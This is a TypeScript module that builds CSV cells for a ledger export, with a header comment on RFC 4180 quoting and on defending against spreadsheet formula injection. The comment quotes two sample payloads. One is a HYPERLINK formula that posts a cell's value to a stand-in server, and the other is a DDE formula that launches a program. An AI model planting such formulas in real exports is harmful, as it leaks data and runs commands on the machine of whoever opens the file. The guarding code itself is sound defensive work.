/**
 * CSV cells for the ledger export, and the one rule RFC 4180 does not have.
 *
 * Every text value that reaches here came out of a vision model reading
 * somebody's Snapchat profile, so display names carry commas, straight quotes,
 * line breaks and emoji as a matter of course. Quoting and doubling is the RFC
 * part, and it is the part that stops one name from shifting every column of
 * its row.
 *
 * The other part is not a formatting concern at all. A cell beginning =, +, -
 * or @ is a FORMULA to Excel, LibreOffice and Google Sheets, and it is
 * evaluated when the operator opens the file, not when it is written. A display
 * name of `=HYPERLINK("http://x/?"&A1,"open")` posts the handle beside it to
 * somebody else's server on the first click, and `=cmd|'/c calc'!A1` is the DDE
 * version of the same trick. Quoting does NOT stop either: the parser strips
 * the quotes first and hands the spreadsheet what is left. A leading apostrophe
 * does -- it is the spreadsheet's own "treat this as text" marker, so the value
 * still reads and is never evaluated. Tab and carriage return lead a formula
 * the same way, so they are guarded too.
 *
 * This lives in one place because the export must never grow a second
 * implementation in the browser: the whole reason the CSV is built server-side
 * is that escaping decided once cannot be decided differently by whoever writes
 * the next screen.
 */

/** Leading characters a spreadsheet reads as the start of an expression. */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/** Characters that force a cell to be quoted, per RFC 4180. */
const MUST_QUOTE = /[",\r\n]/;

/**
 * Excel decides a CSV's encoding by sniffing, and without this it reads UTF-8
 * as the local ANSI codepage: every accent and every emoji in a display name
 * becomes mojibake, silently, in a file that otherwise looks fine.
 */
export const CSV_BOM = '﻿';

export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return '';

  const raw = value instanceof Date ? value.toISOString() : String(value);
  // A number this server computed cannot be a formula, and guarding it would
  // turn a negative into text in a column meant to be summed. Everything else
  // is text out of the ledger and is treated as hostile.
  const guarded = typeof value !== 'number' && FORMULA_LEAD.test(raw);
  const body = guarded ? `'${raw}` : raw;

  // Guarded cells are quoted whether or not they contain a delimiter, so the
  // apostrophe is unambiguously part of the value rather than a stray quote
  // character. Leading or trailing whitespace is quoted for the same reason --
  // some parsers trim unquoted cells and the name would come back different.
  if (guarded || MUST_QUOTE.test(body) || body !== body.trim()) {
    return `"${body.replace(/"/g, '""')}"`;
  }
  return body;
}

/**
 * One record, terminated.
 *
 * CRLF rather than LF, which is RFC 4180 and matters here for a specific
 * reason: a display name containing its own bare newline is legal inside a
 * quoted cell, and a file that used LF for both would leave Excel to guess
 * which newlines end a record.
 */
export function csvRow(cells: readonly unknown[]): string {
  return cells.map(csvCell).join(',') + '\r\n';
}
